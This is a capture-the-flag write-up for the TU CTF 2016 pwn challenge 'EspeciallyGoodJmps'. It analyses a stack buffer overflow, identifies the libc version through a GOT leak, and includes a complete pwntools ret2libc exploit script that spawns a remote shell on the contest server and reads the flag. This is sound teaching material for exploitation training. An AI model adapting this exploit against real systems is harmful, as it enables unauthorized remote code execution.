[](ctf=tu-ctf-2016)
[](type=exploit)
[](tags=buffer overflow)
[](tools=libc-database)
[](techniques=ret2libc)

# EspeciallyGoodJmps (pwn-75)

### Description
>Pop a shell.

>Binary is hosted at: 130.211.202.98:7575

>EDIT:

>ASLR is enabled on remote server.


```bash
$ file 23e4f31a5a8801a554e1066e26eb34745786f4c4
23e4f31a5a8801a554e1066e26eb34745786f4c4: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=afcb1c16b8d5a795af98824aaede8fabc045d4ed, not stripped
```

```bash
$ checksec --file 23e4f31a5a8801a554e1066e26eb34745786f4c4
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   23e4f31a5a8801a554e1066e26eb34745786f4c4

```
Running the program in gdb shows that basic buffer overflow is there.

```bash
gdb-peda$ r
Starting program: /tmp/23e4f31a5a8801a554e1066e26eb34745786f4c4
What's your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
What's your favorite number?
1
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, 1 is an odd number!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xf7fa6000 --> 0x1a8da8
ECX: 0xf7fa7878 --> 0x0
EDX: 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd490 ('A' <repeats 39 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd490 ('A' <repeats 39 times>)
0004| 0xffffd494 ('A' <repeats 35 times>)
0008| 0xffffd498 ('A' <repeats 31 times>)
0012| 0xffffd49c ('A' <repeats 27 times>)
0016| 0xffffd4a0 ('A' <repeats 23 times>)
0020| 0xffffd4a4 ('A' <repeats 19 times>)
0024| 0xffffd4a8 ('A' <repeats 15 times>)
0028| 0xffffd4ac ('A' <repeats 11 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```
So yeah overflow the buffer into saved eip and get a shell from shellcode as no NX means we can keep shellcode on the stack.

But ASLR is enabled, so locating shellcode on the stack might be a pain. There are many approches to pwn it, mine was rather complicated than other exploits I saw after the CTF.

So, first leak an address from libc by reading GOT entry for puts() i.e. call puts(GOT[puts]).Once I have a libc's leaked address I'll find the version using [libc-database](https://github.com/niklasb/libc-database). [libc-database](https://github.com/niklasb/libc-database) can find versions of libc just by the LSB of the leak. We find by the leak that its LSB is 0xc10.

```bash
$ ./find puts c10
ubuntu-trusty-amd64-libc6-i386 (id libc6-i386_2.19-0ubuntu6.6_amd64)
ubuntu-trusty-amd64-libc6-i386 (id libc6-i386_2.19-0ubuntu6.7_amd64)
$ ./dump libc6-i386_2.19-0ubuntu6.7_amd64
offset___libc_start_main_ret = 0x19a63
offset_system = 0x0003fcd0
offset_dup2 = 0x000d9dd0
offset_read = 0x000d9490
offset_write = 0x000d9510
offset_str_bin_sh = 0x15da84
$ ./dump libc6-i386_2.19-0ubuntu6.6_amd64
offset___libc_start_main_ret = 0x19a63
offset_system = 0x0003fcd0
offset_dup2 = 0x000d9dd0
offset_read = 0x000d9490
offset_write = 0x000d9510
offset_str_bin_sh = 0x15da84
```

So we have 2 candidates and both have same offsets. Now we can easily calculate the offsets for system() and "/bin/sh" in libc once we have leaked address from GOT[puts]

First I leak libc's address and then redirect the flow to main() to get control after the leak.
Then I call system("/bin/sh") using the libc's version and leaked address.

[the exploit](./23e4f31a5a8801a554e1066e26eb34745786f4c4.py)

```python
from pwn import *

offset___libc_start_main_ret = 0x19a63
offset_system = 0x0003fcd0
offset_dup2 = 0x000d9dd0
offset_read = 0x000d9490
offset_write = 0x000d9510
offset_str_bin_sh = 0x15da84
offset_puts = 0x64c10

got_puts = 0x804a018
'''$ readelf -r ./23e4f31a5a8801a554e1066e26eb34745786f4c4 | grep puts
0804a018  00000407 R_386_JUMP_SLOT   00000000   puts'''


addr_main = 0x804851d

pop_ret = 0x0804839d

pad = 'A'*44

payload = pad + p32(0x080483e6) + p32(pop_ret) + p32(got_puts) + p32(addr_main) + p32(addr_main)
s = remote('130.211.202.98',7575)

s.recvline()
s.sendline(payload)

s.recvline()
s.send("1\n")
s.recvline()

t=s.recv(4)
puts_leak=u32(t)
s.recvline()


payload1 = pad + p32(puts_leak - offset_puts + offset_system) + p32(pop_ret) + p32(puts_leak - offset_puts + offset_str_bin_sh)

s.sendline(payload1)
s.interactive()
```

gives us

```bash
[+] Opening connection to 130.211.202.98 on port 7575: Done

[*] Switching to interactive mode
$ ls
easy
flag.txt
$ cat flag.txt
TUCTF{th0se_were_s0me_ESPecially_good_JMPs}
```
